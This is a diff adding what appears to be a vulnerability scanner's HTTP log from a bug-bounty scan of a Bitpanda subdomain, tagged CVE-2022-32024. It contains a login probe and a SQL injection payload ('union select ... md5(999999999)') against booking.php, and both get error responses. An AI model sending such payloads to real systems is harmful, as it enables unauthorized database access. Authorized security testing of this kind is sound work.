@@ -1,0 +1,53 @@
+[CVE-2022-32024] Dumped HTTP request for https://techsolutions.bitpanda.com/admin/ajax.php?action=login
+
+
+POST /admin/ajax.php?action=login HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 43
+Content-Type: application/x-www-form-urlencoded
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+username={{username}}&password={{password}}
+[CVE-2022-32024] Dumped HTTP response https://techsolutions.bitpanda.com/admin/ajax.php?action=login
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 11
+Date: Tue, 05 Aug 2025 12:53:22 GMT
+Via: 1.1 e401756dd494b6bbc4d871b5300eb096.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: YA_0LFyNEqdmBWwEWeXUhREXV25Na6mHNjzpjsjjT-jv57mC7hKGRw==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+
+Bad Request
+[CVE-2022-32024] Dumped HTTP request for https://techsolutions.bitpanda.com/booking.php?car_id=-1%20union%20select%201,md5(999999999),3,4,5,6,7,8,9,10--+
+
+
+GET /booking.php?car_id=-1%20union%20select%201,md5(999999999),3,4,5,6,7,8,9,10--+ HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
+Connection: close
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2022-32024] Dumped HTTP response https://techsolutions.bitpanda.com/booking.php?car_id=-1%20union%20select%201,md5(999999999),3,4,5,6,7,8,9,10--+
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 9
+Cache-Control: max-age=30
+Content-Type: text/plain
+Date: Tue, 05 Aug 2025 12:53:23 GMT
+Strict-Transport-Security: max-age=31536000
+Via: 1.1 68a9f2dcbbd436308ba855514c015cf2.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: Q_IlS--4bxd6aeI45ESrvoYNBlTZQ_SiRocJ3uLRSlpLLHjCE3zlRA==
+X-Amz-Cf-Pop: IAD55-P8
+X-Amz-Id-2: FZOxLYr5gQCOjE3am66F1fxPQ68ebVCgiDdmtpr2v/jAg5bfiHxU1G2pfl6l6a5DCJwo3BWVayA=
+X-Amz-Request-Id: 41ZD3J2VHM7GMS5C
+X-Cache: Error from cloudfront
+
+Not Found
